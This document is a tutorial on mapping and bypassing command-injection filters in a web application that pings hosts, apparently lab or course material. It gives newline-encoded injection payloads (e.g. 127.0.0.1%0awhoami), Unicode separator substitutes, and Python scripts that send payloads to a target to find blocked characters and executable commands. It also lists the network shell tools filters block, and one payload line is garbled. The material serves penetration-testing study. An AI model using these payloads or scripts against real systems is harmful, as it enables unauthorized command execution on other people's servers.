# 🛰️ Filter Detection for Web Application

## Testing Alternative Characters

### Extended Character Set:

```bash
# Test various encodings and alternatives
\n    → %0a     → newline (often allowed)
\r    → %0d     → carriage return  
\r\n  → %0d%0a  → Windows line ending
\t    → %09     → tab character
\v    → %0b     → vertical tab
\f    → %0c     → form feed
space → %20     → regular space
```

**Unicode Alternatives:**
```bash
# Unicode variations (if application supports)
;     → %3b     → standard semicolon
;     → %uff1b  → fullwidth semicolon
&     → %26     → standard ampersand  
＆    → %ef%bc%86 → fullwidth ampersand
```

## Command Detection Testing

**After identifying allowed separators, test commands:**

### Basic Commands:
```http
# Using newline separator
ip=127.0.0.1%0awhoami
ip=127.0.0.1%0aid  
ip=127.0.0.1%0alstp=127.0.0.1%0acat
```

### Alternative Commands:
```bash
# If basic commands are blocked, try alternatives
whoami   → w       → /usr/bin/whoami
id       → /usr/bin/id
ls       → dir (Windows) → /bin/ls
cat      → type (Windows) → more → less
```

## Payload Structure Analysis

### Prefix Injection:
```http
ip=whoami%0a127.0.0.1
```

### Suffix Injection:
```http
ip=127.0.0.1%0awhoami
```

### Middle Injection:
```http
ip=127%0awhoami%0a.0.0.1
```

### Multiple Commands:
```http
ip=127.0.0.1%0awhoami%0aid%0als
```

---

## Filter Bypass Strategy Development

### Systematic Approach

**Phase 1: Character Mapping**
```bash
# Create character allowlist/blocklist
✅ Allowed: \n (\r ?) \t (?) ( ) space numbers letters . 
✗ Blocked: ; & | ` $ && || 
? Unknown: \r \t \v \f unicode_alternatives
```

**Phase 2: Command Testing**
```bash
# Test command categories
✅ Basic: whoami id ls cat
✗ Network: nc netcat telnet  
✗ Shells: sh bash zsh
? File: head tail grep awk
```

**Phase 3: Payload Optimization**
```bash
# Build working payload using allowed characters
Base: 127.0.0.1%0awhoami
Extended: 127.0.0.1%0awhoami%0aid
Complex: 127.0.0.1%0a/usr/bin/whoami%0a/usr/bin/id
```

### Documentation Template

**Filter Analysis Report:**
```markdown
## Target: Host Checker Application

### Allowed Characters:
- Alphanumeric: a-z A-Z 0-9 ✅
- Special: . space ( ) ✅  
- Separators: \n (\r?) ✅
- Encoding: URL encoding ✅

### Blocked Characters:
- Operators: ; & | && || ✗
- Substitution: ` $ $() ✗
- [Additional testing needed for: \r \t \v \f]

### Allowed Commands:
- System info: whoami id ✅
- File operations: [testing needed]
- Network: [testing needed]

### Working Payloads:
- Basic: 127.0.0.1%0awhoami
- Multi-command: 127.0.0.1%0awhoami%0aid
```

---

## Common Filter Patterns

### Application-Level Filters

**Simple Blacklist:**
- Blocks common injection characters
- Case-sensitive string matching
- No context awareness
- Easy to bypass with alternatives

**Advanced Application Filters:**
- Regex pattern matching
- Command word detection
- Context-aware filtering
- Parameter validation

### WAF-Level Filters

**Signature-Based:**
- Known attack pattern detection
- Multi-parameter correlation
- HTTP header analysis
- Rate limiting integration

**Behavioral Analysis:**
- Anomaly detection
- Machine learning models
- Statistical analysis
- Dynamic rule adaptation

### Hybrid Approaches

**Multi-Layer Defense:**
1. **Client-side validation** (easily bypassed)
2. **Application input filters** (character/command blocking)
3. **WAF protection** (pattern-based detection)
4. **System-level controls** (sandboxing, permissions)

---

## Testing Automation

### Systematic Character Testing Script

**Python Filter Detector:**
```python
import requests
import urllib.parse

def test_character_filter(base_url, param_name, base_value):
    """Test individual characters for filtering"""
    
    test_chars = [';', '&', '|', '`', '$', '(', ')', '\n', '\r', '\t']
    results = {}
    
    for char in test_chars:
        # Test character individually
        payload = base_value + urllib.parse.quote(char)
        
        response = requests.post(base_url, data={param_name: payload})
        
        if "Invalid input" in response.text:
            results[char] = "BLOCKED"
        elif "ping" in response.text.lower():
            results[char] = "ALLOWED"
        else:
            results[char] = "UNKNOWN"
    
    return results

# Usage
results = test_character_filter(
    "http://target.com/check.php", 
    "ip", 
    "127.0.0.1"
)

for char, status in results.items():
    print(f"Character '{char}' (\\x{ord(char):02x}): {status}")
```

### Command Testing Automation

**Command Enumeration:**
```python
def test_commands(base_url, param_name, separator):
    """Test common commands using identified separator"""
    
    commands = ['whoami', 'id', 'ls', 'cat', 'pwd', 'uname']
    base_payload = "127.0.0.1"
    
    for cmd in commands:
        payload = base_payload + separator + cmd
        encoded_payload = urllib.parse.quote(payload, safe='')
        
        response = requests.post(base_url, data={param_name: encoded_payload})
        
        if "Invalid input" in response.text:
            print(f"Command '{cmd}': BLOCKED")
        elif cmd in response.text or len(response.text) > 200:
            print(f"Command '{cmd}': ALLOWED")
        else:
            print(f"Command '{cmd}': UNKNOWN")
```

---

## Key Takeaways

### Filter Identification Best Practices

**1. Systematic Testing:**
- Start with individual characters
- Test all injection operators
- Document allowed/blocked patterns
- Build comprehensive filter map

**2. Incremental Complexity:**
- Begin with simple payloads
- Gradually increase complexity
- Test command combinations
- Validate bypass techniques

**3. Documentation:**
- Maintain detailed filter analysis
- Track working payloads
- Note environmental constraints
- Plan bypass strategies

### Success Indicators

**✅ Effective Filter Mapping:**
- Clear allowed/blocked character list
- Working injection operator identified
- Command execution confirmed
- Bypass strategy developed

**🔍 Further Investigation Needed:**
- Mixed/inconsistent responses
- Partial command execution
- Timing-based differences
- Context-dependent filtering

This systematic approach to filter identification provides the foundation for developing effective bypass techniques and ensures comprehensive understanding of the target application's security mechanisms.